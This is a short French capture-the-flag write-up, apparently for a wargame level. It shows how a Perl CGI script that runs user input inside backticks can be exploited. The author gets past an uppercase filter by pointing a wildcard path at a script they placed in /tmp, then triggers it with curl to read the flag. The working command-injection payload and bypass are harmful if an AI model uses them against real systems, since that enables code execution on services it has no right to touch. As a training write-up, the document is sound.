J'affiche level12.pl et je vois qui'il y a des backticks qui permettent d'executer du code mais je ne peux pas lancer directement `getflag > /tmp/token` car il  y a une regex au dessus qui transforme tout les lettres en majuscules et il n y a pas de GETFLAG.

Ce que je peux faire c'est passer le chemin d'un fichier qui lui sera executer par les backticks 'x=`/*/GET`'.

La wildcard est la pour recuperer le bon fichier avec egrep sans se faire bloquer par la regex maj.
```bash
cat /tmp/GET
```
```bash
#!/bin/sh
getflag >/tmp/token
```
On rend le script executable pour qu'il puisse être executer par les backticks

```bash
chmod 777 /tmp/GET
```
J'execute la commande curl
```bash
curl http://localhost:4646?x='`/*/GET`''
cat /tmp/token
```